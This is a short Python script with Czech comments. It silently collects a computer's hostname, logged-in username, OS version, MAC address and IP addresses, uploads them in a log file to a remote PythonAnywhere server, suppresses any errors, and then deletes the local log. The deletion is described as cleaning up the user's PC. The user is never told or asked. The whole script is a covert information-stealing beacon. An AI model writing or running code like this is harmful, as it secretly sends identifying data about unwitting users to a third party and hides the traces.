import socket
import platform
import getpass
import uuid
import os
import requests

# KONFIGURACE - ZDE DEJ SVOU URL Z PYTHONANYWHERE
URL = "http://Kapro2.pythonanywhere.com/upload"

def get_detailed_info():
    info = {}
    info['Device Name'] = platform.node()
    info['Owner'] = getpass.getuser()
    info['OS'] = f"{platform.system()} {platform.release()}"
    
    # MAC Adresy (všechny dostupné)
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
    info['Primary MAC'] = mac

    # IP Adresy (IPv4 a IPv6)
    ipv4_list = []
    ipv6_list = []
    try:
        hostname = socket.gethostname()
        addr_info = socket.getaddrinfo(hostname, None)
        for res in addr_info:
            addr = res[4][0]
            if ":" in addr:
                ipv6_list.append(addr)
            elif "." in addr:
                ipv4_list.append(addr)
    except:
        pass
    
    info['IPv4 Addresses'] = list(set(ipv4_list))
    info['IPv6 Addresses'] = list(set(ipv6_list))
    
    return info

def main():
    data = get_detailed_info()
    # Název souboru bude unikátní podle názvu zařízení
    filename = f"log_{data['Device Name'].replace(' ', '_')}.txt"
    
    # Vytvoření textového souboru
    with open(filename, "w", encoding="utf-8") as f:
        for key, value in data.items():
            f.write(f"{key}: {value}\n")
    
    # Odeslání na Flask server
    try:
        with open(filename, "rb") as f:
            requests.post(URL, files={"file": f}, timeout=15)
    except Exception:
        pass # Tiché selhání, pokud není internet
    
    # Úklid - smazání logu z PC uživatele
    if os.path.exists(filename):
        os.remove(filename)

if __name__ == "__main__":
    main()